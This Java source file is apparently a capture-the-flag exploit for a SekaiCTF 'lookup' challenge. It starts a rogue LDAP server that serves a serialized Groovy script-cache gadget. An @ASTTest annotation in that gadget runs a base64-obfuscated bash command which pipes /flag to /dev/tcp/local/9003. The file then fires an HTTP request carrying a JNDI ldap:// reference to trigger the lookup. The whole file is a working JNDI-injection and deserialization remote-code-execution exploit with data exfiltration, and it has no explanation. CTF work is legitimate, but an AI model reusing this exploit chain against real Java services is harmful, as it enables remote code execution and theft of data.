import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.scxml2.env.groovy.GroovyExtendableScriptCache;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Exp implements Runnable {

    static String bashCmd = "/flag > /dev/tcp/local/9003";

    static String cmd = "bash -c {echo," + Base64.getEncoder()
                                                 .encodeToString(bashCmd.getBytes(StandardCharsets.UTF_8)) + "}|{base64,-d}|{bash,-i}";


    static String baseUrl = "https://lookup-jvcwtkoto2v1.chals.sekai.team";

    static int ldapPort = 9000;

    static String ldapRef = String.format("ldap://local:%d/exp", ldapPort);

    static String payloadUrl = String.format("%s//x/lookup?%s", baseUrl, ldapRef);

    public static void main(final String[] args) throws Exception {
        Exp ldapRS = new Exp();
        new Thread(ldapRS).start();
        Thread.sleep(1000);
        httpGet(payloadUrl);
    }

    private static byte[] getPayload() throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objStream = new ObjectOutputStream(byteArrayOutputStream);
        GroovyExtendableScriptCache ges = new GroovyExtendableScriptCache();
        var pl = String.format(
                "@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"%s\")})\ndef x\n",
                cmd);
        System.out.printf("Sending %s\n", pl);
        ges.getScript(pl);
        objStream.writeObject(ges);
        objStream.close();
        return byteArrayOutputStream.toByteArray();
    }

    public static void httpGet(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        System.out.printf("http: %s\n",url);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.getInputStream();
    }

    @Override
    public void run() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=sekai,dc=ctf");
            config.setListenerConfigs(new InMemoryListenerConfig("listen",
                                                                 InetAddress.getByName("0.0.0.0"),
                                                                 ldapPort,
                                                                 ServerSocketFactory.getDefault(),
                                                                 SocketFactory.getDefault(),
                                                                 (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
                @Override
                public void processSearchResult(InMemoryInterceptedSearchResult result) {
                    try {
                        String base = result.getRequest().getBaseDN();
                        System.out.printf("Incoming base=%s, sending payload\n", base);
                        Entry entry = new Entry(base);
                        entry.addAttribute("javaClassName", "");
                        entry.addAttribute("javaSerializedData", getPayload());
                        entry.addAttribute("javaCodeBase", "");
                        entry.addAttribute("objectClass", "javaNamingReference");
                        entry.addAttribute("javaFactory", "");
                        result.sendSearchEntry(entry);
                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }
            });
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

}
